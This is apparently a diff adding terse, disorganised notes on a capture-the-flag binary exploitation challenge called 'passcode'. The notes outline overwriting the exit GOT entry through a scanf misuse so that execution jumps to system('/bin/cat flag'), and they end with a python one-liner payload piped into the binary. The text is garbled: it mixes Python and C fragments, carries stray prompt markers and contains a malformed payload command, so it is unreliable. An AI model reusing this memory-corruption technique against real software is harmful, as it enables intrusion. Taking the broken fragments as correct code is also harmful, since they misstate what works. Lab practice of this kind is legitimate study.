@@ -1,0 +1,35 @@
+import code 
+
+#include<stdlib.h>
+
+void login(){
+
+}
+void welcome(){
+>>> printf("Toddler's secure login system 1.0 beta.\n");
+    >>> //somethin after login
+    
+-------------------------------------
+
+welcome() => char 
+value save => %d variable value address save
+
+passcode1 == 338150,passcode2== 13371337 
+==> function [system()] 
+>flag 
+
+scanf("%d,&passcode1");
+
+                   enter passcode1 : 338150
+            >>>>>>>[[segmentation fault]]<<<<<<<<
+            
+            welcome() => chg passcode1,2
+            
+   0804a018 00000707 R_386_JUMP_SLOT 00000000 exit
+   
+   4byte => system("/bin/cat flag") 
+              jump!
+              ==>0x080485e3
+              ==>scanf
+              
+ (python -c 'print 'print "\x90"*96+\x04\xa0\x04\x08"+"134514147"') | ./passcode
